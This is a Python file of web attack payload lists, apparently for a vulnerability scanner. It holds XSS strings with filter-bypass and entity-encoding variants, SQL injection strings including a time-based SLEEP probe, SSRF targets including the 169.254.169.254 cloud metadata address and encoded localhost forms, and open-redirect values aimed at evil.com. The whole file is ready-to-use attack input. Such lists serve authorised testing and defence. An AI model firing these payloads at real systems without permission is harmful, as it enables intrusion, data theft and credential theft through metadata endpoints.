# =====================
# XSS PAYLOAD FAMILIES
# =====================

XSS = [
    # basic
    '<script>alert("XSS")</script>',

    # case & tag mutation
    '<ScRiPt>alert(1)</ScRiPt>',
    '<svg/onload=alert(1)>',
    '<img src=x onerror=alert(1)>',

    # attribute breaking
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",

    # HTML entity encoding
    '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',

    # filter bypass
    '<scr<script>ipt>alert(1)</scr<script>ipt>',

    # harmless context probe (WAF-safe)
    '<svg/onload=confirm(1)>'
]

# =====================
# SQLI PAYLOADS
# =====================

SQLI = [
    "'",
    "'--",
    "' OR 1=1--",
    "' OR '1'='1",
    "' AND 1=2--",
    "\" OR \"1\"=\"1",
    "'/**/OR/**/1=1--",
    "' OR SLEEP(3)--"
]

# =====================
# SSRF PAYLOADS
# =====================

SSRF = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://169.254.169.254",
    "http://2130706433",     # integer ip
    "http://127.1",
    "http://[::1]"
]

# =====================
# OPEN REDIRECT
# =====================

REDIRECT = [
    "//evil.com",
    "https://evil.com",
    "///evil.com",
    "//evil.com/%2f..",
    "https:%2f%2fevil.com"
]

